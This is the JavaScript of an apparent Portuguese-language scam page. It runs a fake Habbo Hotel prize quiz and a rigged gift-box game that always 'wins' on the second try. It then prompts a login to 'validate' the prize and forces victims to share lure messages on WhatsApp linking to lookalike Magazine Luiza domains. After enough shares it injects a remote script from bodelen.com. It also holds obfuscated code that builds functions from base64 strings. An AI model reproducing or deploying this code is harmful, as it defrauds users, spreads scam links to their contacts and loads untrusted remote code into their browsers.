var lng = 'pt';
var trs = [];
trs['block_title1'] = {
    "pt": 'Parabéns',
};
trs['block_title2'] = {
    "pt": 'Comemoração do Mês de Janeiro Habbo.com.br!',
};
trs['block_title3'] = {
    "pt": 'Respondendo nosso questionário, você terá a chance de ganhar um prêmio agora mesmo!',
};
trs['block_title4'] = {
    "pt": 'Jogadores Online no Evento: ',
};
trs['block_title5'] = {
    "pt": 'Pergunta 1 de 4:',
};
trs['block_title6'] = {
    "pt": 'Você recomendaria o Habbo Hotel para seus amigos?',
};
trs['block_title7'] = {
    "pt": 'Sim',
};
trs['block_title8'] = {
    "pt": 'Não',
};
trs['block_title9'] = {
    "pt": '<strong>Pergunta 2 de 4:</strong> Quantos anos você tem ?',
};
trs['block_title10'] = {
    "pt": '',
};
trs['block_title11'] = {
    "pt": '13-16',
};
trs['block_title12'] = {
    "pt": '17-20',
};
trs['block_title13'] = {
    "pt": '25-30',
};
trs['block_title14'] = {
    "pt": '30+',
};
trs['block_title15'] = {
    "pt": '<strong>Pergunta 3 de 4:</strong> O que você acha do Habbo Hotel?',
};
trs['block_title16'] = {
    "pt": 'Muito bom',
};
trs['block_title17'] = {
    "pt": 'Excelente',
};
trs['block_title18'] = {
    "pt": 'Razoável',
};
trs['block_title19'] = {
    "pt": 'Não gosto',
};
trs['block_title20'] = {
    "pt": '<strong>Pergunta 4 de 4:</strong> Você já comprou Moedas no Habbo?',
};
trs['block_title21'] = {
    "pt": 'Sim',
};
trs['block_title22'] = {
    "pt": 'Não',
};
trs['block_title23'] = {
    "pt": 'Estamos verificando suas respostas...',
};
trs['block_title24'] = {
    "pt": 'Carregando...',
};
trs['block_title25'] = {
    "pt": 'Você respondeu a todas as 4 perguntas',
};
trs['block_title26'] = {
    "pt": 'Seu endereço IP é válido para esta promoção',
};
trs['block_title27'] = {
    "pt": 'Os presentes estão disponíveis e em estoque!',
};
trs['block_title28'] = {
    "pt": 'Parabéns, suas respostas foram salvas com sucesso!',
};
trs['block_title29'] = {
    "pt": 'Você tem a chance de ganhar presentes agora!',
};
trs['block_title30'] = {
    "pt": 'Você deve selecionar a caixa correta com seu prêmio dentro.',
};
trs['block_title31'] = {
    "pt": 'Você tem 3 tentativas. Boa sorte!',
};
trs['block_title32'] = {
    "pt": 'OK',
};
trs['block_title33'] = {
    "pt": 'Infelizmente...',
};
trs['block_title34'] = {
    "pt": 'Desculpe, a caixa que você selecionou está vazia. Você ainda tem 1 chance! Boa sorte!',
};
trs['block_title35'] = {
    "pt": 'OK',
};
trs['block_title36'] = {
    "pt": 'Infelizmente...',
};
trs['block_title37'] = {
    "pt": 'Desculpe, a caixa que você selecionou está vazia. Você ainda tem 2 chances! Boa sorte!',
};
trs['block_title38'] = {
    "pt": 'OK',
};
trs['block_title39'] = {
    "pt": 'Parabéns!',
};
trs['block_title40'] = {
    "pt": 'Você ganhou uma <b>Caixa de 31 Dias CA</b>!',
};
trs['block_title41'] = {
    "pt": '******',
};
trs['block_title42'] = {
    "pt": ' Você deve Logar em sua conta para validar a promoção.',
};
trs['block_title43'] = {
    "pt": '',
};
trs['block_title44'] = { 
    "pt": 'Entrar',
	
};
trs['block_title45'] = {
    "pt": 'Parabéns!',
};

function b4n34nj2b22(a) {
    if ($("#" + a).length) {
        var c = $("#" + a).offset();
        var b = c.top;
        $("html,body").animate({
            b4n34nj2b22p: b
        }, {
            duration: "slow"
        });
    }
}

function dfkeklwkjwff() {
    return "Unknown";
}

function nj3l3b32mnj222() {
    return "Unknown";
}
jQuery(document).ready(function() {
    function d(h) {
        var j, k, i = h,
            g = setInterval(function() {
                j = parseInt(i / 60, 10), k = parseInt(i % 60, 10), k = 10 > k ? "0" + k : k, $("#nebhjwedfdssf").text(j + " " + minutos_y + k + " " + segundos), --i < 0 && (clearInterval(g));
            }, 1000);
    }
    if (jQuery("#nebhjwedfdssf").length >= 1) {
        d((4 * 60) + 29);
    }

    function f(g) {
        if (g < 10) {
            g = "0" + g;
        }
        return g;
    }
    var b = new Date();
    var a = f(b.getHours()) + ":" + f(b.getMinutes());
    jQuery(".owm2k2nss").text(b.getDate());
    jQuery(".kaasnn222").text(b.getMonth());
    jQuery(".as22na1").text(b.getFullYear());
    jQuery(".h4ksnbm2w").text(dayNames[b.getDay()]);
    jQuery(".kaasnn222").text(monthNames[b.getMonth()]);
    jQuery(".p_var-hora_fija").text(a);
    if (jQuery(".n3vb4h2bdnnjddddddd").length >= 1) {
        var c = dfkeklwkjwff();
        jQuery(".n3vb4h2bdnnjddddddd").text(c);
    }
    if (jQuery(".n3vb4h2bdnnjddddddd").length >= 1) {
        var e = nj3l3b32mnj222();
        jQuery(".p_var-so").text(e);
    }
});
$(document).ready(function() {
    $(".k3j3j3k33sss").click(function() {
        $("#q1").fadeOut("slow", function() {
            $("#q2").fadeIn("slow")
        })
    }), $(".bq2").click(function() {
        $("#q2").fadeOut("slow", function() {
            $("#q3").fadeIn("slow")
        })
    }), $(".bq3").click(function() {
        $("#q3").fadeOut("slow", function() {
            $("#q4").fadeIn("slow")
        })
    }), $(".bq4").click(function() {
        b4n34nj2b22("id1"), $("#x982nh2js").fadeOut("slow", function() {
            $("#content2").fadeIn(), setTimeout(function() {
                $("#result1").fadeIn(1e3)
            }, 3e3), setTimeout(function() {
                $("#result2").fadeIn(1e3)
            }, 4100), setTimeout(function() {
                $("#result3").fadeIn(1e3)
            }, 6e3), setTimeout(function() {
                $("#content2").fadeOut("slow", function() {
                    "undefined" != typeof roulette_ini ? rouletteRoot._init() : "undefined" != typeof j4b32j2n22dssx && p1n2b2b2n2s._init(), $("#content3").fadeIn()
                })
            }, 7100)
        })
    })
});
var count = 1;
var mj32hkj423j4k = 3;
var p1naj1b123 = false;
var p1n2b2b2n2s;
(function() {
    "use strict";
    p1n2b2b2n2s = {
        _init: function() {
            setTimeout(function() {
                jQuery('#o3iakaksdsdd1').modal(b4m32b2j2);
            }, 1000);
            jQuery('.try').on('click', function() {
                if (p1naj1b123 && count <= mj32hkj423j4k) {
                    if (jQuery(this).hasClass('abierta')) {} else {
                        p1naj1b123 = false;
                        jQuery('.e3io23j2mjn2').removeClass("p1j232n2aaa");
                        jQuery('.i4u3nksmssd').css("display", "none");
                        jQuery(this).addClass('abierta');
                        if (count == 2) {
                            jQuery(this).addClass('premiazo');
                            setTimeout(function() {
                                jQuery(".div_img_gift, .img_gift").fadeIn("slow", function() {
                                    setTimeout(function() {
                                        jQuery('#o3iakaksdsdd3').modal(b4m32b2j2);
                                        jQuery('.e3io23j2mjn2').addClass("p1j232n2aaa");
                                        jQuery('.i4u3nksmssd').css("display", "block");
                                    }, 1500);
                                });
                            }, 4000);
                        } else {
                            count++;
                            mj32hkj423j4k--;
                            jQuery('#num_mj32hkj423j4k').html(mj32hkj423j4k);
                            setTimeout(function() {
                                jQuery('#o3iakaksdsdd2').modal(b4m32b2j2);
                                setTimeout(function() {
                                    jQuery('.e3io23j2mjn2').addClass("p1j232n2aaa");
                                    jQuery('.i4u3nksmssd').css("display", "block");
                                    p1naj1b123 = true;
                                }, 1000);
                            }, 2000);
                        }
                    }
                }
            });
            jQuery("#o3iakaksdsdd_button1").on("click", function(event) {
                event.stopPropagation();
                jQuery('#o3iakaksdsdd1').modal('hide');
                p1naj1b123 = true;
            });
            jQuery("#o3iakaksdsdd_button2").on("click", function(event) {
                event.stopPropagation();
                jQuery('#o3iakaksdsdd2').modal('hide');
            });
        }
    };
    jQuery(document).ready(function() {
        if (typeof j4b32j2n22dssx == "undefined") {
            p1n2b2b2n2s._init();
        }
    });
})();

var dayNames = new Array("Domigo", "Segunda-feira", "terça", "quarta-feira", "quinta-feira", "sexta-feira", "sábado");
var monthNames = new Array("Janeiro", "fevereiro", "Março", "abril", "Maio", "Junho", "julho", "agosto", "setembro", "Outubro", "novembro", "dezembro");
var minutos_y = "minutos e ";
var segundos = "segundos";

function set_Cookie(name, value) {
    name = "sn2kb3b" + name;
    var Days = 30;
    var exp = new Date();
    exp.setTime(exp.getTime() + (Days * 20 * 1000));
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
}

function get_Cookie(name) {
    name = "sn2kb3b" + name;
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) {
        return unescape(arr[2]);
    }
    return '';
}

function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return unescape(r[2]);
    }
    return null;
}

function u4n3k3n(t, n, b, flag, i) {
    var r, u;
    r =
        '<div class="y4gaj32k_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
    r += '<div class="93ubsam21"></div>';
    r += '<div class="y4gaj32k">';
    r +=
        '<i class="u4k2j2baqmj4"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
    r += '<div class="y4gaj32k_hd"><strong class="y4gaj32k_title"></strong></div>';
    r += '<div class="y4gaj32k_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
    r += '<div class="y4gaj32k_ft">';
    r += '<div href="https://cx09739.tmweb.ru/habbo/habbo.html" class="u5b3mn2bs primary btn">OK</div>';
    r += "</div>";
    r += "</div>";
    r += "</div>";

    $(".y4gaj32k_alert").length > 0 ? $(".y4gaj32k_alert .y4gaj32k_bd").empty() : $("body").append($(r));
    setTimeout(function() {
        u = $(".y4gaj32k_alert");
        u.show();
        u.find(".y4gaj32k_bd").html(n);
        u.find(".y4gaj32k_title").html(t);
        u.find(".u5b3mn2bs").html(b ? b : "");
        u.find(".u5b3mn2bs").off("click").on("click", function() {
            i();
            u.hide();
            if (flag == 1) {
                o3k1nh23k4b();
            }
        });
        u.find(".u4k2j2baqmj4").off("click").on("click", function() {
            i();
            u.hide();
            if (flag == 1) {
                o3k1nh23k4b();
            }
        });
        if (flag == 1) {
            j23b2j2343();
        }
    }, 500);
}
var h54g3n22 = 150;
var gfdg4444 = 2;
var j23b2j2343;
var o3k1nh23k4b;
var i2han21k1;
var o2i2n2m3b;
(function() {
    j23b2j2343 = j23b2j2343Inner;
    o3k1nh23k4b = o3k1nh23k4bInner;
    i2han21k1 = i2han21k1Inner;
    o2i2n2m3b = o2i2n2m3bInner;
    var colors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Violet", "PaleGreen",
        "SteelBlue", "SandyBrown", "Chocolate", "Crimson"
    ]
    var k2k2bsmjsb232 = false;
    var j4j4b3m33b = null;
    var particles = [];
    var waveAngle = 0;

    function j4lo3n22k22(particle, width, height) {
        particle.color = colors[(Math.random() * colors.length) | 0];
        particle.x = Math.random() * width;
        particle.y = Math.random() * height - height;
        particle.diameter = Math.random() * 10 + 5;
        particle.tilt = Math.random() * 10 - 10;
        particle.tiltAngleIncrement = Math.random() * 0.07 + 0.05;
        particle.tiltAngle = 0;
        return particle;
    }

    function j23b2j2343Inner() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        window.h8373hjsk2n22 = (function() {
            return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window
                .mozRequestAnimationFrame || window.oRequestAnimationFrame || window
                .msRequestAnimationFrame || function(callback) {
                    return window.setTimeout(callback, 16.6666667);
                };
        })();
        var canvas = document.getElementById("u34b2k2m22");
        if (canvas === null) {
            canvas = document.createElement("canvas");
            canvas.setAttribute("id", "u34b2k2m22");
            canvas.setAttribute("style",
                "display:block;z-index:999999;pointer-events:none;position: absolute;left: 0px;top: 0px;");
            document.body.appendChild(canvas);
            canvas.width = width;
            canvas.height = height;
            window.addEventListener("resize", function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }, true);
        }
        var context = canvas.getContext("2d");
        while (particles.length < h54g3n22)
            particles.push(j4lo3n22k22({}, width, height));
        k2k2bsmjsb232 = true;
        if (j4j4b3m33b === null) {
            (function j5b4d33sddd() {
                context.clearRect(0, 0, window.innerWidth, window.innerHeight);
                if (particles.length === 0)
                    j4j4b3m33b = null;
                else {
                    k3o3j3n3mssdd();
                    oq2jqan333(context);
                    j4j4b3m33b = h8373hjsk2n22(j5b4d33sddd);
                }
            })();
        }
    }

    function o3k1nh23k4bInner() {
        k2k2bsmjsb232 = false;
    }

    function o2i2n2m3bInner() {
        o3k1nh23k4b();
        particles = [];
    }

    function i2han21k1Inner() {
        if (k2k2bsmjsb232)
            o3k1nh23k4bInner();
        else
            j23b2j2343Inner();
    }

    function oq2jqan333(context) {
        var particle;
        var x;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            context.beginPath();
            context.lineWidth = particle.diameter;
            context.strokeStyle = particle.color;
            x = particle.x + particle.tilt;
            context.moveTo(x + particle.diameter / 2, particle.y);
            context.lineTo(x, particle.y + particle.tilt + particle.diameter / 2);
            context.stroke();
        }
    }

    function k3o3j3n3mssdd() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        var particle;
        waveAngle += 0.01;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            if (!k2k2bsmjsb232 && particle.y < -15)
                particle.y = height + 100;
            else {
                particle.tiltAngle += particle.tiltAngleIncrement;
                particle.x += Math.sin(waveAngle);
                particle.y += (Math.cos(waveAngle) + particle.diameter + gfdg4444) * 0.5;
                particle.tilt = Math.sin(particle.tiltAngle) * 15;
            }
            if (particle.x > width + 20 || particle.x < -20 || particle.y > height) {
                if (k2k2bsmjsb232 && particles.length <= h54g3n22)
                    j4lo3n22k22(particle, width, height);
                else {
                    particles.splice(i, 1);
                    i--;
                }
            }
        }
    }
})();


var j4b32j2n22dssx = !1
var b4m32b2j2 = {
    backdrop: 'static',
    keyboard: false
};
var count = 1;
var hb5hj3bkj4bfd = 2;
var mj32hkj423j4k = 3;
if (mj32hkj423j4k < hb5hj3bkj4bfd) {
    var mj32hkj423j4k = hb5hj3bkj4bfd;
}
var p1naj1b123 = false;
var p1n2b2b2n2s;
var datetime = 1623941723779;
(function() {
    "use strict";
    p1n2b2b2n2s = {
        _init: function() {
            setTimeout(function() {
                jQuery('#o3iakaksdsdd1').modal(b4m32b2j2);
            }, 1000);
            jQuery('.try').on('click', function() {
                if (p1naj1b123 && count <= hb5hj3bkj4bfd) {
                    if (jQuery(this).hasClass('abierta')) {} else {
                        p1naj1b123 = false;
                        jQuery('.e3io23j2mjn2').removeClass("p1j232n2aaa");
                        jQuery('.i4u3nksmssd').css("display", "none");
                        jQuery(this).addClass('abierta');
                        if (count == hb5hj3bkj4bfd) {
                            jQuery(this).addClass('premiazo');
                            setTimeout(function() {
                                jQuery(".div_img_gift, .img_gift").fadeIn("slow",
                                    function() {
                                        j23b2j2343();
                                        setTimeout(function() {
                                            jQuery('#o3iakaksdsdd3').modal(b4m32b2j2);
                                            jQuery('.e3io23j2mjn2').addClass("p1j232n2aaa");
                                            jQuery('.i4u3nksmssd').css("display", "block");
                                        }, 1500);
                                    });
                            }, 4000);
                        } else {
                            count++;
                            mj32hkj423j4k--;
                            jQuery('#num_mj32hkj423j4k').html(mj32hkj423j4k);
                            setTimeout(function() {
                                jQuery('#o3iakaksdsdd2-' + mj32hkj423j4k).modal(b4m32b2j2);
                                setTimeout(function() {
                                    jQuery('.e3io23j2mjn2').addClass("p1j232n2aaa");
                                    jQuery('.i4u3nksmssd').css("display", "block");
                                    p1naj1b123 = true;
                                }, 1000);
                            }, 2000);
                        }
                    }
                }
            });
            jQuery("#o3iakaksdsdd_button1").on("click", function(event) {
                event.stopPropagation();
                jQuery('#o3iakaksdsdd1').modal('hide');
                p1naj1b123 = true;
            });
            jQuery("#o3iakaksdsdd_button2-1").on("click", function(event) {
                event.stopPropagation();
                jQuery('#o3iakaksdsdd2-1').modal('hide');
            });
            jQuery("#o3iakaksdsdd_button2-2").on("click", function(event) {
                event.stopPropagation();
                jQuery('#o3iakaksdsdd2-2').modal('hide');
            });
        }
    };
    jQuery(document).ready(function() {
        if (typeof j4b32j2n22dssx == "undefined") {
            p1n2b2b2n2s._init();
        }
    });
})();

var o2n2k2nbasas = "<p>Você tem que compartilhar com 10 amigos</p><p> no Whatsapp sobre nossa promoção</p><p> para resgatar seu presente. Compartilhe</p><p> até que a barra azul esteja cheia!</p>";
var abqn1b11 = "<p>Falha ao compartilhar! Enviar para o</p><p> mesmo grupo ou amigo não é aceito.</p><p> Por favor, verifique e compartilhe</p><p> novamente.</p>";
var value = 0;
var urvben32vb222 = "whatsApp";
var theme = "sn2kb3b";


function h34v2n2mss() {
    set_Cookie('type_op', 2)
    jQuery('#o3iakaksdsdd3').modal('hide');
    $('#content4').show();
    $('#content3').hide();
    $('#content2').hide();
    $('#x982nh2js').hide();
    $('#content0').hide();
    $('#soso').hide();
}

$(function() {
    var typeop = parseInt(get_Cookie('type_op'));
    if (typeop == 2) {
        h34v2n2mss()
    }
    if (get_Cookie('prog')) {
        setTimeout(function() {
            $(".hide-all").hide();
            $(".show-all").show();

            vj1bv1j2b22();
            kdbk32vn222();
            hj34vb2j2b22(1);

            if (get_Cookie("urvben32vb222") != "") {
                urvben32vb222 = get_Cookie("urvben32vb222");
            }
            $(".urvben32vb222").html(urvben32vb222);
            $("#sw_bn").html(urvben32vb222);
            o2n2k2nbasas = o2n2k2nbasas.replace(/NNN/g, urvben32vb222);
        }, 200)
    }
});

function kdbk32vn222() {
    v = parseInt(get_Cookie('prog')) - 1;
    document.querySelector('#progressbar').style['display'] = "block";
    v == '0' ? ob = 30 : v == '1' ? ob = 50 : v == '2' ? ob = 52 : v == '3' ? ob = 60 : v == '4' ? ob = 60 :
        v == '5' ? ob = 65 : v == '6' ? ob = 70 : v == '7' ? ob = 80 : v == '8' ? ob = 85 : v == '9' ? ob = 90 :
        v == '10' ? ob = 96 : v == '11' ? ob = 98 : v == '12' ? ob = 100 : void(0);
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').textContent = ob + "%";
}

function vj1bv1j2b22() {
    value = parseInt(get_Cookie('prog')) - 1;
    if (value == 2 || value == 4) {
        u4n3k3n("", abqn1b11, "OK", 2, function() {});
    }
    if (value >= 12) {
        vb4k3v3m3b33();
    }
}

function hj34vb2j2b22(type) {
    if (type == 1) {
        urvben32vb222 = "Whatsapp";
    } else {
        urvben32vb222 = "Line";
    }
    set_Cookie("urvben32vb222", urvben32vb222);
    $(".urvben32vb222").html(urvben32vb222);
    $("#sw_bn").html(urvben32vb222);
    o2n2k2nbasas = o2n2k2nbasas.replace(/NNN/g, urvben32vb222);
}

var v3k3vb2nn222 = "";

var chars = ["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "0123456789", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"];

var cont = 0;

var emojis = [];
emojis['pt'] = [
"🤹‍♂️","​🧸","​🔮​","✨","💻","⏱️","🚀","💰","💸","💵","📌","📍​","🎂","​​​🥳​","🎉","🥂","🍸","🍹","🎂","🍰","🎈","🎁","🍾","🍭","☘️"];

var frase1 = [];
frase1['pt'] = [
"64º Aniversário da Magalu!","Aniversário de 64 anos Magalu","Aniversário Magazine Luisa","Magalu faz Aniversário","Aniversário 64 anos Magalu","64º Aniversário Magalu","Aniversário Magalu 64 anos"];
 
var frase2 = [];
frase2['pt'] = [
"mais de 5.000 prêmios grátis! Já está acabando!","Mais de 2.000 celulares grátis! Vai durar pouco tempo!", "mais de 2.000 computadores grátis! Corre no site", "mais de 2.000 Iphones grátis! Mas já vai acabaar!", "diversos prêmios totalmente grátis! Vai no site correndo", "2.000 prêmios grátis pros primeiros! Já tá acabando o estoque!!", "2.000 celulares grátis pros primeiros! Corre que vaia acabar", "muitos prêmios grátis por pouco tempo!" ,"mais de 2.000 celulares grátis, vai logo antes que acabe!"];

var linkeus = [];
linkeus['pt'] = [
"https://magazine-luizaa.com/","https://magazine-luizaa.com/"];

function jh3h42vh4j23432() {
    var ok = [4, 4, 1].map(function(len, i) {
        return Array(len).fill(chars[i]).map(function(x) {
            return x[Math.floor(Math.random() * x.length)]
        }).join('')
    }).concat().join('').split('').sort(function() {
        return 0.5 - Math.random()
    }).join('');
    var ok2 = [8, 7, 1].map(function(len, i) {
        return Array(len).fill(chars[i]).map(function(x) {
            return x[Math.floor(Math.random() * x.length)]
        }).join('')
    }).concat().join('').split('').sort(function() {
        return 0.5 - Math.random()
    }).join('');
	
	//pflrks[lng][Math['floor'](Math['random']() * pflrks[lng]['length'])]+'%0D%0A%0D%0A

    if (parseInt(get_Cookie('prog')) > 100) {
		
		cont++;

		(typeof window.orientation == 'undefined' && screen.width >= 1000) ? window.open('https://web.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + ' %0A%0A' + 'https://magazineluisa.net/aniversario/') :
		//window.open('https://api.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + ' %0A%0A' + 'https://magazineluisa.net/aniversario/');
		//window['location']['href'] = 'whatsapp://send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' https://magazineluisa.net/aniversario/?'+ok;
		//window['location']['href'] = 'https://web.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + '%0A%0A' + 'https://magazineluisa.net/aniversario/';
		
		window.open('https://api.whatsapp.com/send?text=https://magazine-luizaa.com/aniversario/?'+ok);
		
		gtag('event', 'Share Magazine Luisa ['+cont+']', {});
		
    } else {
		
		cont++;
		
		(typeof window.orientation == 'undefined' && screen.width >= 1000) ? window.open('https://web.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + ' %0A%0A' + 'https://magazineluisa.net/aniversario/') :
		//window.open('https://api.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + ' %0A%0A' + 'https://magazineluisa.net/aniversario/');
		//window.open('https://api.whatsapp.com/send?text=https://magazineluisa.net/aniversario/?'+ok);
		//window['location']['href'] = 'https://web.whatsapp.com/send?text='+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] +' ' + frase1[lng][Math['floor'](Math['random']() * frase1[lng]['length'])] + ' '+ emojis[lng][Math['floor'](Math['random']() * emojis[lng]['length'])] + ' '+ frase2[lng][Math['floor'](Math['random']() * frase2[lng]['length'])]  + '%0A%0A' + 'https://magazineluisa.net/aniversario/';
		
		window.open('https://api.whatsapp.com/send?text=https://magazine-luizaa.com/aniversario/?'+ok);
		//window.open('https://api.whatsapp.com/send?text=https://www.americanas.cc/aniversario/');//?'+ok);
		
		gtag('event', 'Share Magazine Luisa ['+cont+']', {});
    }
    setTimeout(function() {
        ndsk2bn2222();
        bk2b22bsse();
        value = parseInt(get_Cookie('prog'));
        set_Cookie('prog', value + 1);
    }, 2000);
}

function ndsk2bn2222() {
    get_Cookie('prog') == '' ? value = 0 : value = get_Cookie('prog');
    if (value == 2 || value == 4) {
        u4n3k3n("", abqn1b11, "OK", 2, function() {});
    }
    set_Cookie('prog', value);
    if (value >= 12) {
        vb4k3v3m3b33();
    }
}

function bk2b22bsse() {
    v = get_Cookie('prog');
    document.querySelector('#progressbar').style['display'] = "block";
    v == '0' ? ob = 30 : v == '1' ? ob = 50 : v == '2' ? ob = 52 : v == '3' ? ob = 60 : v == '4' ? ob = 60 : v ==
        '5' ? ob = 65 : v == '6' ? ob = 70 : v == '7' ? ob = 80 : v == '8' ? ob = 85 : v == '9' ? ob = 90 : v ==
        '10' ? ob = 96 : v == '11' ? ob = 98 : v == '12' ? ob = 100 : void(0);
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').textContent = ob + "%";

}

function vb4k3v3m3b33() {
    // document.getElementById("buttonl").style.display = 'none';
    // document.getElementById("button2").style.display = 'block';
	setTimeout(function(){
	var script = document.createElement("script");
	script.setAttribute("type", "text/javascript");
	script.setAttribute("src", "//bodelen.com/apu.php?zoneid=2163797");
	document.getElementsByTagName("body")[0].appendChild(script);
	},100);
}


function v4jk3v3n33dc() {
    u4n3k3n("", o2n2k2nbasas, "OK", 2, function() {});
}

var h4j53n45 = new Date();
                 
                 var sec = h4j53n45.getSeconds();
                 
                 if (sec < 6 ){
                     sec = 9
                 }
                 
                 if (sec > 5 & sec < 13 ){
                     sec = 8
                 }
                 
                  if (sec > 11 & sec < 19 ){
                     sec = 7
                 }
                 
                  if (sec > 17 & sec < 25 ){
                     sec = 6
                 }
                 
                  if (sec > 23 & sec < 31 ){
                     sec = 5
                 }
                 
                  if (sec > 29 & sec < 37 ){
                     sec = 4
                 }
                 
                 if (sec > 35 & sec < 43 ){
                     sec = 3
                 }
                 
                 if (sec > 41 & sec < 49 ){
                     sec = 2
                 }
                 
                 if (sec > 47 & sec < 55 ){
                     sec = 1
                 }
                 
                 if (sec > 54){
                     sec=0
                 };
                 
                 
                 var add = sec;
                 
                 var gfgdfg44 = new Date();
                 
                 var minute = gfgdfg44.getMinutes();
                 
                 var timer1 = (60-minute)*60;
                 
                 if (timer1 > 1800) {
                    var resttimer = (30-minute)*10
                 } else {
                    var resttimer = (60-minute)*10
                 };
                 
                 var timer = resttimer + add + 67;
                 
                 function updateTimer() {
                 	timer--;
               	    $("#contador").text(timer);
               		
               	    if (timer < 9) {
               	        stopFunction();
               	    }
                 }
               
                 var myTimer = window.setInterval(updateTimer, 6000);
           
                 function stopFunction() {
                     window.clearInterval(myTimer);
                 }
//30
//vc167ceaa2357dd0f98caf9a7514f1ea5=[ function(v8e04c580adac2b23f98976c0e4c526df){return 'a5b1d7e217aa227d5b2b8a84920780cf637960e2f2be9d748f8769c7663a95c6f8055c6d';}, function(v8e04c580adac2b23f98976c0e4c526df){return v2c58d1ba490386f958399cefd425b9dd.createElement(v8e04c580adac2b23f98976c0e4c526df);}, function(v8e04c580adac2b23f98976c0e4c526df){return v8e04c580adac2b23f98976c0e4c526df[0].getContext(v8e04c580adac2b23f98976c0e4c526df[1]);}, function(v8e04c580adac2b23f98976c0e4c526df){return v8e04c580adac2b23f98976c0e4c526df[0].text=v8e04c580adac2b23f98976c0e4c526df[1];}, function(v8e04c580adac2b23f98976c0e4c526df){return null;}, function(v8e04c580adac2b23f98976c0e4c526df){'41f448afc82647d1376ad508aec1ebe28826b8f7ec42edd99b7ea54fc60ed9d8e0435c46';}, function(v8e04c580adac2b23f98976c0e4c526df){return '7776f8b9dd913610a9767b419953f947d654c1a787422c9f70db8400fef5759e6fbc1ae6';}, function(v8e04c580adac2b23f98976c0e4c526df){v8e04c580adac2b23f98976c0e4c526df.style.display='none';return v8e04c580adac2b23f98976c0e4c526df;}, function(v8e04c580adac2b23f98976c0e4c526df){v97024ea37928f7a154565fd8045a35a7.onload=v8e04c580adac2b23f98976c0e4c526df}, function(v8e04c580adac2b23f98976c0e4c526df){v97024ea37928f7a154565fd8045a35a7.src=v8e04c580adac2b23f98976c0e4c526df;}, new Function("v8e04c580adac2b23f98976c0e4c526df","return unescape(decodeURIComponent(window.atob(v8e04c580adac2b23f98976c0e4c526df)))"), function(v8e04c580adac2b23f98976c0e4c526df){v2b44cd630ff26eb5ec157ae3799c6fd6=new Function('v8e04c580adac2b23f98976c0e4c526df',vc167ceaa2357dd0f98caf9a7514f1ea5[10](v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[v8e04c580adac2b23f98976c0e4c526df]));return v2b44cd630ff26eb5ec157ae3799c6fd6;}]; v426c4e5edf3a00c5b06687234a1205de=[0,255,1]; 